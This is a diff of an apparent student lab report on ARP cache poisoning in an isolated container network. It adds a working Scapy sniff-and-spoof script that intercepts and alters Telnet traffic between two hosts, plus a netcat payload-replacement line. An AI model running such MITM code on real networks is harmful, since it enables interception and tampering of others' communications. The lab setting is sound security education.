@@ -55,7 +55,7 @@ sendp(pkt)
 The above program performs the attack.
 
 As we can see from the before and after, the poisoned ARP entry is correctly produced on A's machine:
-![img.png](img.png) ![img_2.png](img_2.png)
+![img.png](REPORT_FILES/scrsh1.png) ![img_2.png](REPORT_FILES/scrsh3.png)
 ### Task #1.B (using ARP reply)
 On host M, we construct an ARP reply packet to map B’s IP address to
 M’s MAC address. We send the packet to A and check whether the attack is successful or not.
@@ -83,11 +83,11 @@ The above program performs the attack.
 #### Scenario 1: B’s IP is already in A’s cache
 We clear A's ARP cache and fill it with B's correct entry and we perform the attack
 As the before and after screenshots show, it succeeds:
-![img_4.png](img_4.png) ![img_3.png](img_3.png)
+![img_4.png](REPORT_FILES/scrsh5.png) ![img_3.png](REPORT_FILES/scrsh4.png)
 #### Scenario 2: B’s IP is not in A’s cache
 We clearn A's ARP cache and try the attack again. The before and after screenshots show, again,
 that the attack fails:
-![img.png](img.png) ![img.png](img.png)
+![img.png](REPORT_FILES/scrsh1.png) ![img.png](REPORT_FILES/scrsh1.png)
 ### Task #1.C (using ARP gratuitous message)
 On host M, we construct an ARP gratuitous packet, and use
 it to map B’s IP address to M’s MAC address. We launch the attack under the same two scenarios
@@ -116,11 +116,11 @@ The above program performs the attack.
 #### Scenario 1: B’s IP is already in A’s cache
 We first fill B's IP in A's ARP cache. Then, as the before and after screenshots show,
 the attack is successful:
-![img_4.png](img_4.png) ![img_3.png](img_3.png)
+![img_4.png](REPORT_FILES/scrsh5.png) ![img_3.png](REPORT_FILES/scrsh4.png)
 #### Scenario 2: B’s IP is not in A’s cache
 We clearn A's ARP cache and try the attack again. The before and after screenshots show, again,
 that the attack fails:
-![img.png](img.png) ![img.png](img.png)
+![img.png](REPORT_FILES/scrsh1.png) ![img.png](REPORT_FILES/scrsh1.png)
 ## Task #2. MITM Attack on Telnet using ARP Cache Poisoning
 Hosts A and B are communicating using Telnet, and Host M wants to intercept their communication, so it
 can make changes to the data sent between A and B. 
@@ -167,15 +167,15 @@ We do that with the following command: `# sysctl net.ipv4.ip_forward=0`.
 After the attack is successful,
 we try to ping each other between Hosts A and B. As can be seen from the screenshots, 
 in both cases the ping does not receive a response:
-![img_5.png](img_5.png) ![img_6.png](img_6.png)
+![img_5.png](REPORT_FILES/scrsh6.png) ![img_6.png](REPORT_FILES/scrsh7.png)
 
 ### Step 3. (Turn on IP forwarding)
 Now we turn on the IP forwarding on Host M with the following command: `# sysctl net.ipv4.ip_forward=1`, so it will forward the
 packets between A and B, and we repeat Step 2.
 
 As we can see from the following screenshot, A and B can now ping each other
-and a redirection happens.
-![img_8.png](img_8.png) ![img_9.png](img_9.png)
+and a redirection gets signaled.
+![img_8.png](REPORT_FILES/scrsh9.png) ![img_9.png](REPORT_FILES/scrsh10.png)
 
 ### Step 4. (Launch the MITM attack)
 
@@ -191,8 +191,73 @@ accomplish this goal. In particular, we would like to do the following:
 B. Once the connection is established, we turn off the IP forwarding using the following command.
 `# sysctl net.ipv4.ip_forward=0`
 - We run our sniff-and-spoof program on Host M, such that for the captured packets sent from A to B,
-we spoof a packet but with TCP different data. For packets from B to A (Telnet response), we do not
+we spoof a packet but with different TCP data. For packets from B to A (Telnet response), we do not
 make any change, so the spoofed packet is exactly the same as the original one.
+```
+#!/usr/bin/env python3
+
+from scapy.all import *
+from scapy.layers.inet import IP, TCP
+
+IP_A = "10.9.0.5"
+MAC_A = "02:42:0a:09:00:05"
+IP_B = "10.9.0.6"
+MAC_B = "02:42:0a:09:00:06"
+MAC_M = "02:42:0a:09:00:69"
+
+
+def spoof_pkt(pkt):
+    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
+        # Create a new packet based on the captured one.
+        # 1) We need to delete the checksum in the IP & TCP headers,
+        # because our modification will make them invalid.
+        # Scapy will recalculate them if these fields are missing.
+        # 2) We also delete the original TCP payload.
+        newpkt = IP(bytes(pkt[IP]))
+        del newpkt.chksum
+        del newpkt[TCP].payload
+        del newpkt[TCP].chksum
+        if pkt[TCP].payload:
+            # Construct the new payload based on the old payload.
+            data = pkt[TCP].payload.load  # The original payload data
+            newdata = data if data[0] == 0xFF else 'Z'
+            send(newpkt / newdata)
+        else:
+            send(newpkt)
+    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
+        # Create new packet based on the captured one
+        # Do not make any change
+        newpkt = IP(bytes(pkt[IP]))
+        del newpkt.chksum
+        del newpkt[TCP].chksum
+        send(newpkt)
+
+
+f = f"tcp and not ether src {MAC_M}"
+pkt = sniff(iface="eth0", filter = f, prn = spoof_pkt)
+```
+The code above captures all the TCP packets related to A, and then for packets from A to B,
+it changes all letters to a `Z` and runs successfully.
 
 ##  Task 3. MITM Attack on Netcat using ARP Cache Poisoning
-## Takeaways
+This task is similar to Task 2, except that Hosts A and B are communicating using netcat, instead of
+telnet. Host M wants to intercept their communication, so it can make changes to the data sent between
+A and B. We use the following commands to establish a netcat TCP connection between A and B:
+```
+On Host B (server, IP address is 10.9.0.6), run the following:
+# nc -lp 9090
+On Host A (client), run the following:
+# nc 10.9.0.6 9090
+```
+Once the connection is made, we can type messages on A. Each line of messages will be put into a TCP
+packet sent to B, which simply displays the message. We  replace every occurrence of the word
+_SIMONE_ in the message with a sequence of A’s.
+
+```
+newdata = data.replace(b"SIMONE", b"AAAAAA") if b"SIMONE" in data else data
+```
+To complete the task, we only need to change the previous task's code where the new packet
+is generated. This code correctly intercepts and substitutes the substring, if present, as shown by the following
+screenshot:
+
+![img_10.png](REPORT_FILES/scrsh11.png)
